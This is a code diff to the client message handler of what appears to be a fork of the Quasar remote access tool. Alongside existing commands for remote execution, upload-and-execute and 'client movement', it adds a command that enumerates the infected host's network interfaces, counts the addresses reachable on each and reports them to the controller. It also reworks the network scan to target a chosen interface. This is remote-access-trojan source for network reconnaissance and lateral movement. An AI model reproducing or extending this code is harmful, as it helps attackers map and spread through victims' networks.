@@ -8,6 +8,7 @@ using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.other;
 using Quasar.Common.Messages.Network;
+using Quasar.Common.Models.Network;
 using Quasar.Common.Networking;
 using System;
 using System.Collections.Generic;
@@ -47,7 +48,8 @@ namespace Quasar.Client.Messages
         public bool CanExecute(IMessage message) => message is DoNetworkScan ||
                                                     message is DoClientMovement ||
                                                     message is DoRemoteCommandExecute ||
-                                                    message is DoUploadAndExecute;
+                                                    message is DoUploadAndExecute ||
+                                                    message is DoInterfaceScan;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -67,26 +69,36 @@ namespace Quasar.Client.Messages
                 case DoUploadAndExecute msg:
                     Execute(sender, msg);
                     break;
+                case DoInterfaceScan msg:
+                    Execute(sender, msg);
+                    break;
             }
         }
 
         private void Execute(ISender client, DoNetworkScan message)
         {
-            MessageBox.Show("Scanning interfaces...");
-            List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
-            MessageBox.Show($"Found {interfaces.Count} interfaces!");
             Task.Run(() =>
             {
-                foreach (InterfaceEntity nic in interfaces)
-                {
-                    MessageBox.Show($"Beginning scan on {nic.Name}");
-                    ScannerHelper.ScanInterfaceAction(nic, (addressEntity, nicEntity) =>
+                    MessageBox.Show($"Beginning scan on {message.nic.Name}");
+                    ScannerHelper.ScanInterfaceAction(message.nic, (addressEntity, nicEntity) =>
                     {
-                        _client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
+                        client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
                         MessageBox.Show($"Added new network entity: {addressEntity.Address}");
                     }, client);
-                }
             });
+        }
+
+        private void Execute(ISender client, DoInterfaceScan message)
+        {
+            List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
+            List<int> potentialIps = new List<int>();
+            foreach (InterfaceEntity nic in interfaces)
+            {
+                int ipCount = ScannerHelper.CalculateTotalPotentialIPs(nic);
+                potentialIps.Add(ipCount);
+            }
+            DoInterfaceScanResponse response = new DoInterfaceScanResponse { Interfaces = interfaces.ToArray(), PotentialIps = potentialIps.ToArray() };
+            client.Send(response);
         }
 
         private void Execute(ISender client, DoClientMovement message)
